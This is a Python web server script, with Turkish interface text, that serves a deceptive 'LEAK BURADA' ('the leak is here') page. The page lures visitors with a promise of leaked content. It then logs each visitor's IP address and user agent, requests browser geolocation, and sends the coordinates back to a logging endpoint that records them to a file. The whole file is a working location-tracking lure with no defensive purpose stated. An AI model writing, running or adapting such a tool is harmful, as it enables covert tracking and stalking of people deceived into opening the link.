from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import socket
from datetime import datetime
from urllib.parse import urlparse, parse_qs

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/log':
            query_params = parse_qs(parsed_path.query)
            lat = query_params.get('lat', ['Bilinmiyor'])[0]
            lon = query_params.get('lon', ['Bilinmiyor'])[0]
            ip = query_params.get('ip', ['Bilinmiyor'])[0]
            
            print(f"\n[+] KONUM YAKALANDI!")
            print(f"IP: {ip} | Enlem: {lat} | Boylam: {lon}")
            
            with open("konum_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"IP: {ip} | Lat: {lat} | Lon: {lon} | Zaman: {datetime.now()}\n")
                
            self.send_response(200)
            self.end_headers()
            return

        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        user_agent = self.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        log_entry = {
            "timestamp": timestamp,
            "ip": client_ip,
            "path": self.path,
            "user_agent": user_agent
        }
        
        print(f"\n[+] BAĞLANTI -> IP: {client_ip}")
        
        with open("leak_logs.txt", "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")
            
        html_response = f"""<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>LEAK BURADA</title>
    <style>
        body {{ background: #000000; color: #ff0033; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .box {{ background: #111111; padding: 40px; border: 2px solid #ff0033; border-radius: 8px; text-align: center; box-shadow: 0 0 20px rgba(255,0,51,0.5); }}
        h1 {{ font-size: 2.5rem; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 3px; }}
        p {{ color: #ffffff; font-size: 1.1rem; }}
        .ip {{ color: #38bdf8; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="box">
        <h1>LEAK BURADA</h1>
        <p>İçerik yükleniyor, lütfen bekleyin...</p>
        <p>IP Adresiniz: <span class="ip">{client_ip}</span></p>
        <p id="loc">Konum alınıyor...</p>
    </div>
    <script>
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function(position) {{
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                document.getElementById("loc").innerText = "Konum: " + lat + ", " + lon;
                fetch('/log?lat=' + lat + '&lon=' + lon + '&ip={client_ip}');
            }}, function(error) {{
                document.getElementById("loc").innerText = "Konum izni reddedildi.";
            }});
        }} else {{
            document.getElementById("loc").innerText = "Tarayıcı konum desteklemiyor.";
        }}
    </script>
</body>
</html>"""
        
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html_response.encode("utf-8"))

    def log_message(self, format, *args):
        return

def run_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, RequestHandler)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'
    finally:
        s.close()
        
    print(f"[*] Sunucu aktif!")
    print(f"[*] Bilgisayar için: http://localhost:{port}")
    print(f"[*] Aynı Wi-Fi'daki telefon için: http://{local_ip}:{port}")
    
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
